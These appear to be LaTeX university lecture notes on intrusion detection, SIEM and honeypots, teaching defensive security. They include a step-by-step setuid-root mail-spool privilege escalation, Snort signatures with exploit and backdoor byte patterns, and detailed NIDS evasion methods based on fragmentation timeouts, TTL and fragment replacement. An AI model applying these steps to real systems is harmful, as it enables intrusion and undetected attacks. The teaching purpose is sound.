+IDSs \textbf{Requirements} include: to run continually; be fault tolerant; resist subversion; impose a reasonable overhead on system; configured according to system security policies; adapt to changes in systems and users; scale to monitor large numbers of systems; provide graceful degradation of service; allow dynamic reconfiguration. \medskip\\
+The efficiency of an IDS system is measured on:
+\begin{itemize}
+	\item \textbf{Accuracy}: the proper detection of attacks and the absence of false alarms;
+	\item \textbf{Performance}: the rate at which traffic and audit events are processed. To keep up with traffic, it may not be able to put IDS at network entry point. Instead, place multiple IDSs downstream;
+	\item \textbf{Fault tolerance}: resistance to attacks. Should be run on a single hardened host that supports only intrusion detection services;
+	\item \textbf{Timeliness}: time elapsed between intrusion and detection.
+\end{itemize}
+
+\subsection{Intrusion Detection Approaches}
+Intrusion detection works on the base of modeling the attack/intrusion. This modeling works on features (evidences extracted from audit data) which are pieced together in the analysis. Analyse includes \textbf{misuse detection} (aka signature-based), \textbf{anomaly detection} (aka behavioural-based) and \textbf{specification-based detection}.
+
+\subsubsection*{Misuse detection}
+It is the equivalent of the “default allow” policies, so you ”blacklist” patterns that are believed to be related to malicious activities; these patterns can be a chain of system calls (host based intrusion) or payloads in network protocols. It is signature-based, with very diffused detection technique and easy to deploy. It has a typical implementation for network-based IDSs. As all blacklisting approaches (signature-based), it can only detect patterns that are already known. \medskip\\
+Signatures can be more advanced than a single pattern, it is necessary to observe events on the system and apply a set of rules to decide if there is an intruder. Possible approaches are:
+\begin{itemize}
+	\item \textbf{rule-based anomaly detection}: analyze historical audit records for expected behavior, then match with current behavior;
+	\item \textbf{rule-based penetration identification}: rules identify known penetrations/weaknesses, often by analyzing attack scripts from Internet, supplemented with rules from security experts.
+\end{itemize}
+\begin{center}
+	\begin{tabular}{|c|l|l|}\hline
+		Step & Command & Comment \\ \hline
+		1. & \lstinline|%cp /bin/csh /usr/spool/mail/root|& assumes no root mail file \\ \hline
+		2. & \lstinline|%chmod 4755 /usr/spool/mail/root|& make setuid file \\ \hline
+		3. & \lstinline|%touch x|& create empty file \\ \hline
+		4. & \lstinline|%mail root < x|& mail root empty file \\ \hline
+		5. & \lstinline|%/usr/spool/mail/root|& execute setuid-to-root shell \\ \hline
+		6. & \lstinline|root%|& \\ \hline
+	\end{tabular}
+\end{center}
+A single command/pattern cannot represent an attack, but a chain of commands spotted forming a signature can.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec49b.png}
+\end{center}
+Example: if (traffic contains “\lstinline|x90+de[^\r\n]{30}|”) then “attack detected”. The advantage is that it is mostly accurate (no false positives), but it can't detect new attacks.
+
+\subsubsection*{Anomaly detection}
+Assumes the intruder behaviour differs from a legitimate profile. Building a legitimate profile may be an issue: it depends on data used for profiling (e.g. sampled vs whole dataset) and a profile can evolve, making the new “legitimate activity” looks suspicious.
+It can be used both for \textbf{HIDS} (syscall, system file hashing, system states, ...) and \textbf{NIDS} (protocol analysis, similar to application proxy, using monitoring as opposed to filtering). There exists different approaches:
+\begin{itemize}
+	\item \textbf{threshold detection}: checks excessive event occurrences over time. Alone is a crude and ineffective intruder detector. Both thresholds and time intervals must be determined;
+	\item \textbf{profile based}: characterize past behavior of users/groups, then detect significant deviations. It is based on analysis of audit records: it gathers metrics (counter, guage, interval timer, resource utilization), analyzes (mean and standard deviation, multivariate, markov process, time series, operational model) and model as a classification problem (machine learning classifiers).
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec49c.png}
+\end{center}
+Defines a profile describing “normal” behavior, then detects deviations; thus can detect potential new attacks. A problem, however, is that it has relatively high false positive rates. Anomalies can just be new normal activities, and be caused by other element faults (e.g., router failure or misconfiguration, P2P misconfig). Which method will detect DDoS SYN flooding?
+
+\subsubsection*{Specification-based detection}
+Manually develop specifications that capture legitimate (not only previous seen) system behavior: any deviation from it is an attack. Pros is that it can avoid false-positive since the specification and capture all legitimate behavior. However it is hard to develop a complete and detailed specification (may be feasible for simple and specific protocols), and it is error-prone. Approaches:
+\begin{itemize}
+	\item state machine, extended finite state automata (EFSA)
+	\item augment FSA with state variables
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec49d.png}
+\end{center}
+
+\subsubsection*{IDS Principles}
+Anomaly detection leads to errors. Detectors assume intruder behavior differs from legitimate users: an overlap, as shown, is expected, observing deviations from past history. There are problems of false positives and false negatives, so a compromise is required.
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec49e.png}
+\end{center}
+
+\subsubsection*{Base-rate fallacy - can we have actually good detection rates?}
+As said, both anomaly and misuses detection necessarily lead to false positives and false negatives. A NIDS with 99\% true positive rate and 99\% true negative rate seems to have high-reliability alarms. So if an alarm fires up, you should worry, if no alarm fires up, all is good. However these statistics are incomplete because they can mislead about the total amount of cases. So the \textbf{base-rate fallacy} is used, which is a simple derivation from Bayes theorem, very well known by medics and doctors and still making its way through in InfoSec. \medskip\\
+The base-rate fallacy [Axelsson 2000] states that tests with high true positives and negatives rates yield much “worse” results than expected by the average user. The Bayes theorem is:
+$$P(A|B)= \dfrac{P(A)\cdot P(B|A)}{\sum_{i=1}^{n}P(A_i)\cdot P(B|A_i)}$$
+with the denominator being $P(B)$ expanded to all “n” cases for A that B comprises. 
+
+\subsubsection*{Base-rate fallacy example}
+Let's make the classic medical example where Attack = illness and IDS Alarm = medical test.
+\begin{itemize}
+	\item A=event is patient is sick
+	\item B=medical test says patient is sick
+	\item $P(A|B)$ = patient is actually sick given that test said so (equivalent to “there is an actual attack given that NIDS fired alarm”)
+	\item set TP=99\%; TN=99\% so $P(B|A) = 0.99$
+	\item Diseases are rare. Say $1/10.000$ people have the illness, so $P(A)=1/10.000$. Most of network traffic is legitimate.
+\end{itemize}
+$$P(A|B)= \dfrac{1/10000 \cdot 0.99}{1/10000 \cdot 0.99 + (1- 1/10000) \cdot 0.01} = 0.00980... \approx 1 \%$$
+There is only 1\% chance that patient is sick when test says so!
+
+\subsubsection*{Host-based IDSs}
+Host-based IDS (HIDS) use OS auditing and monitoring/analysis mechanisms to find malware, can execute full static and dynamic analysis of a program to monitor shell commands and system calls executed by user applications and system programs. It has the most comprehensive program info for detection, thus it is accurate. Problem is that only a local view of the attack is given: if the attacker takes over the machine, it can tamper with IDS binaries and modify audit logs.
+
+\subsubsection*{Distributed Host-Based IDS}
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec49f.png}
+\end{center}
+
+\subsubsection*{Network-Based IDS}
+Network-based IDS (NIDS) monitor traffic at selected points on a network in (near) real time to detect intrusion patterns. They may examine network, transport and/or application level protocol activity directed toward systems. A NIDS comprises a number of sensors, inline (possibly as part of other net device) and passive (monitors copy of traffic).
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec49g.png}
+\end{center}
+There are usually not just one but more sensors deployed at strategic locations (e.g., packet sniffing via tcpdump at routers). 
+A sensor inspecting network traffic watches for violations of protocols and unusual connection patterns, and rarely look into the packet payload for malicious code. A big limitation is that it is not possible to execute the payload or do any code analysis; even DPI gives limited application-level semantic information. Huge amount of traffic is recorded and processed, so the performance can be easily impacted. NIDS may also be easily defeated by encryption, but this can be mitigated with encryption only at the gateway/prox.
+
+\subsubsection*{Host-based vs. Network-based IDS}
+In any setting is more probable to have a combination of the two systems because it can happen that an attack can only be detected by host-based IDS but not network-based IDS. For example a dictionary attack can be detected just by HIDS, while the propagation of a worm just by NIDS. %TODO giusto????
+
+\subsubsection*{Architectural aspects}
+\begin{itemize}
+	\item External NIDS: analysis of all set of incoming traffic. Only general signatures are possible, with high incidence of FP. All detected “attempted attacks” are logged, and "normal" Internet traffic may generate many alarms;
+	\item Internal NIDS: analysis of traffic allowed by the firewall. More specific signatures are possible (e.g. based on services behind firewall, subnet characteristics, ...). It says nothing about attacks attempted but blocked by firewall.
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec50.png}
+\end{center}
+
+\subsubsection*{Example: SNORT signatures}
+SNORT is an open source intrusion detection tool, with a big active community that generates signatures for known attacks, so that it is possible to install already existent rules. A rule is a single line, the rule header is everything before parenthesis and the rule option is what’s in the parenthesis. The syntax for a rule header is:
+\begin{lstlisting}
+	rule_action protocol src_add_range src_prt_range
+		dir_operator dest_add_range dest_prt_range
+\end{lstlisting}
+An example (prevent phising):
+\begin{lstlisting}
+	alert tcp 192.168.1/24 1:1024 -> 124.17.8.1 80
+\end{lstlisting}
+\begin{itemize}
+	\item \textbf{rule actions}: alert, drop, log, ....
+	\item \textbf{protocol}: tcp, udp, icmp, ...
+	\item \textbf{direction}: -> and <>
+	\item \textbf{src,dst port ranges}.
+\end{itemize}
+Another example:
+\begin{lstlisting}
+	alert icmp $EXTERNAL_NET any -> $HOME_NET any
+		(msg: "ICMP PING NMAP; dsize: 0; itype:8";)
+\end{lstlisting}
+The rule generates an alert for ICMP having empty payload, ICMP type 8, and arriving from the outside. This is part of an NMAP ping.\medskip\\
+Another example:
+\begin{lstlisting}
+	alert tcp $EXTERNAL_NET any -> $HOME_NET 139
+		(msg: "DOS SBMdie attack":; flags: A+;
+		content:"|57724c6568004577a|";)
+\end{lstlisting}
+The rule generates alert if a TCP packet from outside contains \lstinline{|57724c6568004577a|} in payload and is headed to port 139 (netbios) for some internal host. This is part of a buffer overflow attack on a computer running Server Message Block Service.\medskip\\
+Another example:
+\begin{lstlisting}
+	alert tcp $HOME_NET 2589 -> $EXTERNAL_NET any
+		(msg:"MALWARE-BACKDOOR - Dagger_1.4.0";
+		flow:to_client,established; content:"2|00 00 00 06
+		00 00 00|Drives|24 00|"; depth:16;
+		metadata:ruleset community; classtype:misc-
+		activity; sid:105; rev:14;)
+\end{lstlisting}
+\begin{itemize}
+	\item dsize: payload size
+	\item offset: XX; (start at byte XX in payload)
+	\item depth: YY; (stop at byte YY in payload)
+\end{itemize}
+The baseline implementation of network IDS is of type misuse detection, because it is easier to implement and network traffic is hard to predict even on well-controlled environments. Example of a signature:
+\begin{lstlisting}
+	alert
+		tcp $EXTERNAL_NET any -> $HOME_NET 139
+		flow:to_server,established
+		content:"|eb2f 5feb 4a5e 89fb 893e 89f2|"
+		msg:"EXPLOIT x86 linux samba overflow"
+		reference:bugtraq,1816 reference:cve,CVE-1999-0811
+\end{lstlisting}
+ 	
+\subsection{NIDS evasion [Siddharth 2005]}
+Intrusion detection tools are not perfect. In an article by Siddharth, the evasion technique is described.
+Signature-based evasion can be fairly trivial when understanding the technicality of the network and how it works in practice. It depends on the implementation of actual signature content: for example \lstinline|"/bin/bash"| detects remote calls to bash, but does not detect the string \lstinline|"/etc/../bin/bash"|, etc.\\
+More advanced techniques are typically based on IP fragmentation. All these techniques have a common goal: a NIDS sees a different packet than the client.
+Look at these keeping in mind you may want to prevent the attacker from performing network mapping and OS fingerprinting.
+
+%TODO 08.04 video 2, riguardare
+\subsubsection*{Evasion technique – Reassembly time-out}
+This attack is possible because the time-out of the sensors (of the IDS) may be different from the time-out of the victim (host receiving the packet). The time-out is necessary to avoid the DoS attack after the fragmentation, when the receiver is waiting for all the fragments before rebuilding the message. \medskip\\ There are 2 cases of this attack. 
+\begin{itemize}
+	\item \textbf{Case 1: The IDS fragmentation reassembly timeout is less than fragmentation reassembly timeout of the Victim.}\\
+	Suppose the IDS fragmentation reassembly timeout is 15 seconds and the system is monitoring some Linux hosts which have a default fragmentation reassembly timeout of 30 seconds. As shown below in the figure, after sending the first fragment the attacker can send the second fragment with a delay of 15 seconds but still within 30 seconds.
+	\begin{center}
+		\includegraphics[scale=0.8]{img/netsecET1.jpg}
+	\end{center}
+	Now, the victim reassembles the fragments whereas at the IDS the fragmentation reassembly timeout parameter kicks in and a timeout occurs. Remember, here the second fragment received by the IDS will be dropped as the IDS has already lost the first fragment, due to time out. Thus the victim will reassemble the fragments and will receive the attack whereas the IDS will not make any noise or generate alerts.
+	\item \textbf{Case 2: The IDS fragmentation reassembly timeout is more than the fragmentation reassembly timeout of the operating system.}\\
+	By default, Snort has a fragment reassembly timeout of 60 seconds. Compare that to Linux/FreeBSD where it is 30 seconds. This can be evaded as well. As shown below in the figure, consider that the attacker has fragmented the attack packet into four segments: 1,2,3,4.
+	\begin{center}
+		\includegraphics[scale=0.8]{img/netsecET2.jpg}
+	\end{center}
+	The attacker sends frag2 and frag4 with a false payload (referred as 2', 4'), which are received by both the victim and the IDS. She waits until the fragments' reassembly timeout occurs at the victim's end and it drops the initial fragments (30 seconds in this case).
+	
+	The beauty of the attack is that the victim still has not received fragment 1 so it will quietly drop the fragments and no ICMP error message will be thrown by the victim. The attacker then sends packet (1, 3) with a legitimate payload. At this stage, the victim has only fragments (1, 3) whereas the IDS has fragments (1,2',3,4'). Remember that the 2,4 fragments sent by attacker have a false payload.
+	
+	Since the IDS has all the 4 fragments it will do a TCP reassembly. Also, since fragments 2 and 4 have false payloads the net checksum computed will be invalid. So, the IDS will drop the packet. However, now the victim has only fragments 1,3. If the attacker now sends fragments 2, 4 again with valid payload, the IDS will have only these two fragments (2,4 with a valid payload as the previous fragments have been reassembled and dropped) whereas the victim will have all (1,3,2,4) fragments all with a valid payload, and it will do a reassembly and read the packet as an attack.
+\end{itemize}
+
+\subsubsection*{Evasion technique – Time-to-live}
+These attacks require the attacker to have a prior knowledge of the topology of the victim's network. This information can be obtained by using tools such as traceroute which give the information on the number of routers between the attacker and the victim. A TTL based attack is shown below.
+\begin{center}
+	\includegraphics[scale=0.8]{img/netsecET3.jpg}
+\end{center}
+A router is present between the IDS and a victim - and the attacker is assumed to have this prior information. The attacker carries out the attack by breaking it into three fragments. She sends fragment 1 with a large TTL value and this is received by both the IDS and the victim. However, the second fragment (frag2') sent by the attacker has a TTL value of 1 and also has a false payload. This fragment is received by the IDS whereas the router (which is situated between the IDS and the victim) discards it as the TTL value is now reduced to zero.
+
+The attacker then sends fragment 3 with a valid TTL. This makes the IDS perform a TCP-reassembly on fragments (1,2',3), whereas the victim still waits for the third fragment. The attacker finally sends the third fragment with a valid payload and the victim performs a reassembly on fragments (1, 2, 3) and gets the attack. At this stage, the IDS has only fragment 3 as it has already performed a reassembly and the stream has been flushed.
+
+\subsubsection*{Evasion technique – Fragment replacement}
+Some operating systems replace fragments with newer ones, others keep old fragments.
+\begin{center}
+	\includegraphics[scale=0.8]{img/netsecET4.jpg}
+\end{center}
+The attacker carries out the attack by breaking it in 4 fragments. She sends fragment 1, fragment 2 and fragment 3 first, which both operating systems accept. Now the attacker sends fragment 2', fragment 3' and fragment 4. Here the payload of fragment 2' and fragment 3' is different from fragment 2 and fragment 3, respectively, but the fragment offset and the length of the fragment along with other fields in the IP-header remain the same. In such a scenario, an operating system doing a fragment reassembly based on policy First will do a reassembly on fragments 1,2,3,4 whereas the operating system doing a fragments reassembly based on policy Last will reassemble fragments 1,2',3',4.
+
+\subsection{Audit Records}
+Logs are a fundamental tool for intrusion detection. Two variants:
+\begin{itemize}
+	\item \textbf{native audit records} (provided by O/S): always available but may not be optimum;
+	\item \textbf{detection-specific audit records} (IDS specific): additional overhead but specific to IDS task, often log individual elementary actions (e.g. may contain fields for: subject, action, object, exception-condition, resource-usage, time-stamp).
+\end{itemize}
+
+\newpage
+\subsection{Security Information and Event Management (SIEM)} 
+SIEM is a system combining \textbf{Security Information Management} (SIM) and \textbf{Security Event Management} (SEM). SEM deals with real-time monitoring, correlation of events and threat intelligence, notifications and console views. SIM deals with long-term storage and analysis and reporting of log data.
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsecSIEM.jpg}
+\end{center}
+
+\subsubsection*{SIEM Workflow}
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec51a.png}
+\end{center}
+Defines methods of collecting data from sources.
+\begin{itemize}
+	\item \textbf{Aggregation}: to gather data together as a whole in singular repository;
+	\begin{center}
+		\includegraphics[scale=0.2]{img/netsec50a.png}
+	\end{center}
+	\item \textbf{Normalization}: to create consistent records by type and format. Data coming from different sources have to go through this to avoid inefficiency in the analysis. 
+\end{itemize}
+
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec51b.png}
+\end{center}
+Links events to identify attacks. 
+\begin{itemize}
+	\item \textbf{Event based}: a single event identifies an attack;
+	\item \textbf{Rule based}: if $X + Y + Z$ then do $A$, if $X$ repeated 3 times within an hour, then do $Y$;
+	\item \textbf{Anomaly based}: if the traffic on port $X$ exceeds the standard deviation of historic traffic patterns, then there may be a problem.
+\end{itemize}
+
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec51c.png}
+\end{center}
+Severity is usually scored in a scale that goes from Low to Critical.
+\begin{center}
+	\includegraphics[scale=0.2]{img/netsec50b.png}
+\end{center}
+Upon identifying a threat, notifications are sent to the security administrators (SOC, Security Operation Center). There may be an automated response: the majority of SIEM tools can execute external scripts to react on identified threats (change to FW rules, issue a Remedy ticket).
+
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec51d.png}
+\end{center}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec50c.png}
+\end{center}
+
+\begin{center}
+	\includegraphics[scale=0.35]{img/netsec51e.png}
+\end{center}
+Collected log data is stored for future forensic investigations; this phase is not equivalent to \textbf{Log Management} solutions.
+
+\subsubsection*{SIEM vs. LM}
+\begin{tabular}{|l|c|c|} \hline
+	\textbf{Functionality} & \textbf{SIEM} & \textbf{Log Management} \\ \hline\hline
+	Log collection & \thead{Security related logs} & All logs \\\hline
+	Log pre-processing & \thead{Parsing, normalization,\\ categorization, and enrichment} & Indexing, parsing, or none \\\hline
+	Log retention & \thead{Retain parsed and \\normalized data} & Retain raw log data \\\hline
+	Reporting & \thead{Security focused reporting} & Broad use reporting \\\hline
+	Analysis & \thead{Correlation, threat scoring, \\event prioritization} & Full text analysis, tagging \\\hline
+	Alerting and notification & \thead{Advanced security \\focused
+		reporting} & Simple alerting on all logs \\\hline
+	Other features & \thead{Incident management, analyst \\ workflow, context analysis, etc.} & High scalability of collection and storage \\\hline	
+\end{tabular}
+
+\subsection{Honeypots}
+Honeypots are decoy systems filled with fabricated informations   (that look real), instrumented with monitors/event loggers, that divert and hold attacker to collect activity info, without exposing production systems. Initially were single systems, more recently are/emulate entire networks.
+
+\subsubsection*{Physical V.S. Virtual Honeypots}
+\begin{itemize}
+	\item \textbf{Physical}: real machines, with own IP Addresses, often high-interactive;
+	\item \textbf{Virtual}: simulated by other machines that respond to the traffic sent to the honeypots and that may simulate a lot of (different) virtual honeypots at the same time. More limited than the physical because modern attacks can distinguish them more easily.
+\end{itemize}
+\begin{center}
+	\includegraphics[scale=0.4]{img/netsec52a.png}
+\end{center}
+Honeypots cann be used for \textbf{production} and for \textbf{research}.
+
+\subsubsection*{Production HPs: Protect the systems}
+Prevention is usually not the scope, keeping the bad guys out is not effective as a prevention mechanisms: Deception, Deterence, Decoys do NOT work against automated attacks (worms, auto-rooters, mass-rooters). Usually an honeypot is effective for \textbf{detection} (detecting the burglar when he breaks in) and \textbf{response} (can easily be pulled offline, has little to no data pollution).
+
+\subsubsection*{Research HPs: gathering information}
+Collect compact amounts of high value information, discover new Tools and Tactics, understand Motives, Behavior, and Organization, develop Analysis and Forensic Skills.
+
+\subsubsection*{Honeypot deployment}
+An important aspect for honeypots is where they should be placed.\\
+\begin{minipage}{0.45\textwidth}
+	\begin{enumerate}
+		\item \textbf{Outside the external firewall}: it is useful for tracking attempts to connect to unused IP addresses with the scope of the network. However, being outside, it does not decrease the risk for the network and has also the disdadvantage that it has little to no ability to trap internal attackers, since it sees only external traffic, especially if the firewall filters traffic in both directions;
+		\item \textbf{Inside the DMZ}: the security administrator has to be sure that the other systems in the DMZ are secured against the activity generated by the honeypot. A disadvantage is that tipically the DMZ is not fully accessible and the firewall blocks traffic to the DMZ that attempts unneeded services. Removing those restrictions in the firewall might be dangerous;
+ 	\end{enumerate}
+\end{minipage}\hfill
+\begin{minipage}{0.52\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.42]{img/netsec52b.png}
+	\end{center}
+\end{minipage}
+\begin{enumerate}
+	\item[3.] \textbf{Inside the network}: it is possible to catch internal attacks (the most dangerous), detect misconfigured firewalls that forward unpermitted traffic. However, as seen previously, a path to reach the honeypot has to be left open for the attacker, which if it compromises and subverts the machines without someone realising it, really gets in the heart of the system.
+\end{enumerate}
+
+
+
+
+\end{document}
